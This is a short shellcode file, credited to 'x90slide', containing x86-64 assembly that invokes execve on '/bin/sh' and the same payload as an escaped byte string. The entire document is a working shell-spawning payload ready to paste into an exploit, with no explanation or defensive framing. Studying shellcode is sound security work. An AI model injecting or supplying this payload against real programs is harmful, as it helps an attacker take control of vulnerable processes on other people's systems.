# Shellcode by x90slide

.global _start
_start:
.intel_syntax noprefix
	mov rax, 59
	lea rdi, [rip+binsh]
	mov rsi, 0
	mov rdx, 0
	syscall
binsh:
	.string "/bin/sh"

# "\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x10\x00\x00\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00"
